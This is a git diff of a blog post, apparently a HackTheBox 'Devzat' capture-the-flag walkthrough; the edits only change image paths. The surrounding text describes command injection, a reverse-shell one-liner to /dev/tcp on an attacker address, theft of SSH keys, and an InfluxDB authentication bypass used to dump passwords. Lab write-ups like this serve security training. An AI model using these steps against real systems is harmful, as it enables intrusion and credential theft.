@@ -6,10 +6,9 @@ draft: false
 tags: [HackTheBox]
 categories: [Hacking]
 cover:
-    image: "https://www.hackthebox.com/storage/avatars/43a4b7b2ba6e11c48b128aa46cddaf49.png" # image path/url
+    image: "images/cover.png" # image path/url
     alt: "Devzat" # alt text
-    caption: "" # display caption under cover
-    relative: false # when using page bundles set this to true
+    relative: true # when using page bundles set this to true
 ---
 
 # Introduction
@@ -91,12 +90,12 @@ trent@TMDeal-kali[Devzat]$ cat /etc/hosts
 10.10.14.1    devzat.htb
 ...
 ```
-![http://devzat.htb Homepage](/images/htb/devzat/website/homepage.png)
+![http://devzat.htb Homepage](./images/website/homepage.png)
 
 Not much about the site itself is interesting. However, there is a message at the bottom informing
 the reader that they are invited to try out their chat app.
 
-![Chat App Usage](/images/htb/devzat/website/chat_app_start_instructions.png)
+![Chat App Usage](./images/website/chat_app_start_instructions.png)
 
 When running the instructed command, you may receive an error about no matching host key type. This
 error can be resolved by adding a few lines to ~/.ssh/config
@@ -109,7 +108,7 @@ Host devzat.htb
 	HostkeyAlgorithms +ssh-rsa
 ```
 
-![Initial Connection](/images/htb/devzat/chat_app/initial_connection.png)
+![Initial Connection](./images/chat_app/initial_connection.png)
 
 ### Chat App First Look
 
@@ -121,12 +120,12 @@ now. We will come back to this at a later point
 Taking a look back at port 80, since we needed to add an entry to /etc/hosts, it may be worthwhile
 to scan for subdomains. We will scan for subdomains using Gobuster.
 
-![Pets Subdomain Discovery](/images/htb/devzat/website/pets/gobuster_subdomain_discovery.png)
+![Pets Subdomain Discovery](./images/website/pets/gobuster_subdomain_discovery.png)
 
 Our scan finds one valid subdomain at http://pets.devzat.htb The homepage is an incomplete CRUD
 app.
 
-![http://pets.devzat.htb Homepage](/images/htb/devzat/website/pets/homepage.png)
+![http://pets.devzat.htb Homepage](./images/website/pets/homepage.png)
 
 The most that can be done is adding a pet to the pet inventory, but its not hooked up to a database
 so nothing saves. Running Gobuster to find other endpoints shows that http://pets.devzat.htb/.git/
@@ -157,14 +156,14 @@ This is probably the source code for the pets web application. Inside of main.go
 takes our input without sanitizing it and passes it to `exec.Command`. This means we can inject our
 own commands into this command and gain remote code execution
 
-![Call to exec.Command](/images/htb/devzat/git/main_execs_sh.png)
+![Call to exec.Command](./images/git/main_execs_sh.png)
 
 ## Shell as Patrick
 
 To test if we can properly execute code, we will just see if we can get the contents of /etc/passwd
 
-![Burp Payload](/images/htb/devzat/git/burp_payload.png)
-![Contents of /etc/passwd](/images/htb/devzat/git/dumping_etc_passwd.png)
+![Burp Payload](./images/git/burp_payload.png)
+![Contents of /etc/passwd](./images/git/dumping_etc_passwd.png)
 
 Now that we now we can actually exploit this, we can execute a callback to a netcat listener.
 
@@ -172,12 +171,12 @@ We base64 encrypt the command `bash -i >& /dev/tcp/10.10.14.7/4444 0>&1` and the
 execute it in a one liner. This is done to avoid messing up the payload with special characters like
 `"` or `'`.
 
-![Sending the request with Burp](/images/htb/devzat/git/rce_request.png)
-![Shell as Patrick](/images/htb/devzat/shell_as_patrick.png)
+![Sending the request with Burp](./images/git/rce_request.png)
+![Shell as Patrick](./images/shell_as_patrick.png)
 
 From there, we can grab Patrick's ssh key for a better shell experience
 
-![Shell as Patrick](/images/htb/devzat/shell_as_patrick_ssh.png)
+![Shell as Patrick](./images/shell_as_patrick_ssh.png)
 
 ## Shell as Catherine
 
@@ -186,7 +185,7 @@ From there, we can grab Patrick's ssh key for a better shell experience
 After running linpeas, we can see that there are some ports that are open locally that we could not
 previously access
 
-![Open local ports](/images/htb/devzat/linpeas/active_ports.png)
+![Open local ports](./images/linpeas/active_ports.png)
 
 Right now, we do not know what these ports do, so we will look around some more.
 
@@ -195,13 +194,13 @@ Right now, we do not know what these ports do, so we will look around some more.
 We can see Patrick's chat log in the chat app by logging into it while logged into the machine as
 Patrick
 
-![Patrick chat log](/images/htb/devzat/patrick_chat_log.png)
+![Patrick chat log](./images/patrick_chat_log.png)
 
 Looking up info on Influxdb shows that it runs on port 8086 by default, and is thus likely what we
 saw earlier in linpeas. We can check the version of Influxdb running by making a HEAD request with
 curl on port 8086
 
-![Influxdb version](/images/htb/devzat/influxdb/influxdb_version.png)
+![Influxdb version](./images/influxdb/influxdb_version.png)
 
 Looking up "Influxdb 1.7.5" on google shows results for
 [CVE-2019-20933](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933)
@@ -211,38 +210,38 @@ to port forward with ssh in order to access the database on our machine.
 
 `ssh -L 8086:127.0.0.1:8086 patrick@10.10.11.118 -i patrick_id_rsa`.
 
-![Login as admin on Influxdb](/images/htb/devzat/influxdb/admin_access.png)
+![Login as admin on Influxdb](./images/influxdb/admin_access.png)
 
 From there, we can dump the data from the users table
 
-![Database dump](/images/htb/devzat/influxdb/user_passwords.png)
+![Database dump](./images/influxdb/user_passwords.png)
 
 This reveals a few users and their passwords, but Catherine sticks out because that is a user on the
 box. Attempting to use this password to switch users to Catherine is successful
 
-![Shell as Catherine](/images/htb/devzat/shell_as_catherine.png)
-![User flag](/images/htb/devzat/user_get.png)
+![Shell as Catherine](./images/shell_as_catherine.png)
+![User flag](./images/user_get.png)
 
 ## Shell as Root
 
 Now that we are Catherine, lets examine her chat log like we did for Patrick.
 
-![Catherine chat log](/images/htb/devzat/catherine_chat_log.png)
+![Catherine chat log](./images/catherine_chat_log.png)
 
 The chat log mentions the development version of the chat app is up on port 8443, and the source
 code is in a backup file. Checking in /var/backup we find archives of the development and main
 version.
 
-![Backup files](/images/htb/devzat/chat_app/backup_files.png)
+![Backup files](./images/chat_app/backup_files.png)
 
 Extracting and checking the this version of the code shows a new command `file` has been added that
 allows reading files on the system. A password is required, but it is hardcoded into the app, so we
 can just read it. Since this program is running as root, we can read roots ssh key
 
-![Password to run command](/images/htb/devzat/dev_chat_app/pass_for_reading_files.png)
-![Reading root ssh key](/images/htb/devzat/dev_chat_app/root_ssh_key.png)
+![Password to run command](./images/dev_chat_app/pass_for_reading_files.png)
+![Reading root ssh key](./images/dev_chat_app/root_ssh_key.png)
 
 Then we can just ssh as root
 
-![Shell as root](/images/htb/devzat/shell_as_root.png)
-![Root flag](/images/htb/devzat/root_get.png)
+![Shell as root](./images/shell_as_root.png)
+![Root flag](./images/root_get.png)
